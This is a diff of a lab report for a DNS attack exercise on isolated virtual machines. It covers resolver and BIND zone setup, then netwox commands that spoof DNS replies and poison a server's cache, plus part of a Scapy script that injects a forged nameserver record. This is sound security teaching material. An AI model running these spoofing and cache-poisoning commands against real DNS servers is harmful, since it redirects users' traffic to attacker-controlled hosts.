@@ -3,14 +3,14 @@
 **Date**: February 18, 2026  
 **Environment**: SEED Ubuntu VM, VirtualBox  
 **Topology**:
-- User VM: 192.168.56.101 (Host-Only, enp0s3)
-- DNS Server VM: 192.168.56.104 (Host-Only, enp0s3)
-- Attacker VM: 192.168.56.105 (Host-Only, enp0s3)
-- NAT Network (Adapter 2): 10.10.0.0/24 for outbound DNS sniffing
+
+- User VM: 10.10.0.12 (NAT Network, enp0s3)
+- DNS Server VM: 10.10.0.13 (NAT Network, enp0s3)
+- Attacker VM: 10.10.0.11 (NAT Network, enp0s3)
 
 **VirtualBox settings (all VMs):**
-- Adapter 1: Host-Only Adapter (vboxnet0)
-- Adapter 2: NAT Network (LabNAT)
+
+- Adapter 1: NAT Network (10.10.0.0/24)
 - Promiscuous Mode: Allow All
 
 ---
@@ -20,18 +20,22 @@
 **Goal**: Force the user VM to use the local DNS server VM.
 
 **Commands** (User VM):
+
 ```bash
-sudo sh -c 'printf "nameserver 192.168.56.104\n" > /etc/resolvconf/resolv.conf.d/head'
+sudo nano /etc/resolvconf/resolv.conf.d/head
 sudo resolvconf -u
+cat /etc/resolv.conf
 ```
 
 **Verification**:
-```bash
-dig @192.168.56.104 www.google.com
-```
-**Observation**: The `SERVER` field shows `192.168.56.104#53`, confirming responses are from the local DNS server.
 
-**Screenshot**: include `dig` output showing `SERVER: 192.168.56.104#53`.
+```bash
+dig www.google.com
+```
+
+**Observation**: The resolver config shows multiple nameservers (`192.168.56.104`, `10.10.0.13`, and `127.0.1.1`). The `dig` output reports `SERVER: 10.10.0.13#53`, confirming the local DNS server handled the query.
+
+**Screenshot**: include `cat /etc/resolv.conf` (showing both `192.168.56.104` and `10.10.0.13`) and `dig` output showing `SERVER: 10.10.0.13#53`.
 
 ---
 
@@ -40,6 +44,7 @@ dig @192.168.56.104 www.google.com
 **Goal**: Configure BIND and disable DNSSEC for attack demonstrations.
 
 **Key configuration** (`/etc/bind/named.conf.options`):
+
 ```conf
 options {
     dump-file "/var/cache/bind/dump.db";
@@ -49,16 +54,16 @@ options {
 };
 ```
 
-**Commands** (DNS Server VM):
+**Commands** (User VM):
+
 ```bash
-sudo service bind9 restart
-sudo rndc dumpdb -cache
-sudo rndc flush
+ping -c 2 www.google.com
+ping -c 2 www.google.com
 ```
 
-**Observation**: BIND restarts successfully and cache control works.
+**Observation**: The first and second pings resolve successfully, indicating DNS resolution and caching are working. The resolved IP changed between runs, which is normal due to multiple Google A records.
 
-**Screenshot**: include terminal output showing `bind9` restart and/or cache dump.
+**Screenshot**: include both `ping -c 2` outputs and Wireshark DNS capture showing the initial DNS query.
 
 ---
 
@@ -67,49 +72,53 @@ sudo rndc flush
 **Goal**: Serve `example.com` and reverse lookup records locally.
 
 **Zone definitions** (`/etc/bind/named.conf`):
+
 ```conf
 zone "example.com" {
     type master;
     file "/etc/bind/example.com.db";
 };
-zone "56.168.192.in-addr.arpa" {
+zone "0.168.192.in-addr.arpa" {
     type master;
-    file "/etc/bind/192.168.56.db";
+    file "/etc/bind/192.168.0.db";
 };
 ```
 
 **Forward zone** (`/etc/bind/example.com.db`):
+
 ```conf
 $TTL 3D
-@   IN  SOA ns.example.com. admin.example.com. (1 8H 2H 4W 1D)
-@   IN  NS  ns.example.com.
-www IN  A   192.168.56.101
-mail IN A   192.168.56.102
-ns  IN  A   192.168.56.104
+@ IN SOA ns.example.com. admin.example.com. (1 8H 2H 4W 1D)
+@ IN NS ns.example.com.
+@ IN MX 10 mail.example.com.
+www IN A 192.168.0.101
+mail IN A 192.168.0.102
+ns IN A 192.168.0.10
+*.example.com. IN A 192.168.0.100
 ```
 
-**Reverse zone** (`/etc/bind/192.168.56.db`):
+**Reverse zone** (`/etc/bind/192.168.0.db`):
+
 ```conf
 $TTL 3D
-@   IN  SOA ns.example.com. admin.example.com. (1 8H 2H 4W 1D)
-@   IN  NS  ns.example.com.
-101 IN  PTR www.example.com.
-102 IN  PTR mail.example.com.
-104 IN  PTR ns.example.com.
+@ IN SOA ns.example.com. admin.example.com. (1 8H 2H 4W 1D)
+@ IN NS ns.example.com.
+101 IN PTR www.example.com.
+102 IN PTR mail.example.com.
+10 IN PTR ns.example.com.
 ```
 
 **Verification** (User VM):
-```bash
-dig @192.168.56.104 www.example.com
 
-dig @192.168.56.104 -x 192.168.56.101
+```bash
+dig www.example.com
 ```
 
-**Observation**: Responses are authoritative (`aa` flag) and map to the local zone records.
+**Observation**: The response is authoritative (`aa` flag) and maps `www.example.com` to `192.168.0.101` from the local DNS server `10.10.0.13`.
 
 **Screenshots**:
-- `dig www.example.com` showing `A 192.168.56.101`
-- reverse lookup showing `PTR www.example.com`
+
+- `dig www.example.com` showing `A 192.168.0.101` and `SERVER: 10.10.0.13#53`
 
 ---
 
@@ -118,6 +127,7 @@ dig @192.168.56.104 -x 192.168.56.101
 **Goal**: Demonstrate local name override via `/etc/hosts`.
 
 **Commands** (User VM):
+
 ```bash
 ping -c 2 www.bank32.com
 sudo nano /etc/hosts
@@ -137,6 +147,7 @@ dig www.bank32.com
 **Goal**: Spoof DNS reply directly to the user’s query.
 
 **Attacker VM**:
+
 ```bash
 sudo netwox 105 -h "www.example.net" -H 1.2.3.4 -a "ns.example.net" \
   -A 192.168.56.104 -d enp0s3 -T 600 \
@@ -145,6 +156,7 @@ sudo netwox 105 -h "www.example.net" -H 1.2.3.4 -a "ns.example.net" \
 ```
 
 **User VM**:
+
 ```bash
 dig www.example.net
 ```
@@ -160,11 +172,13 @@ dig www.example.net
 **Goal**: Poison the DNS server’s cache so it serves forged answers later.
 
 **DNS Server VM**:
+
 ```bash
 sudo rndc flush
 ```
 
 **Attacker VM** (NAT network on enp0s8):
+
 ```bash
 sudo netwox 105 -h "p4g77.example.net" -H 1.2.3.4 -a "ns.example.net" \
   -A 192.168.56.104 -d enp0s8 -T 600 \
@@ -172,6 +186,7 @@ sudo netwox 105 -h "p4g77.example.net" -H 1.2.3.4 -a "ns.example.net" \
 ```
 
 **User VM**:
+
 ```bash
 dig p4g77.example.net
 ```
@@ -187,6 +202,7 @@ dig p4g77.example.net
 **Goal**: Poison the DNS server to use an attacker-controlled nameserver for all `example.net` hosts.
 
 **Attacker VM (Scapy script)**: `/home/seed/poison_auth.py`
+
 ```python
 from scapy.all import *
 
@@ -212,17 +228,20 @@ sniff(iface="enp0s8",
 ```
 
 **User VM**:
+
 ```bash
 dig z9k11.example.net
 ```
 
 **DNS Server VM**:
+
 ```bash
 sudo rndc dumpdb -cache
 sudo cat /var/cache/bind/dump.db | grep -A 3 "example.net.*NS"
 ```
 
 **Observation**:
+
 - `dig` shows `z9k11.example.net` resolves to `1.2.3.4`.
 - AUTHORITY section shows `example.net IN NS attacker.local`.
 - Cache dump contains `example.net. NS attacker.local.`
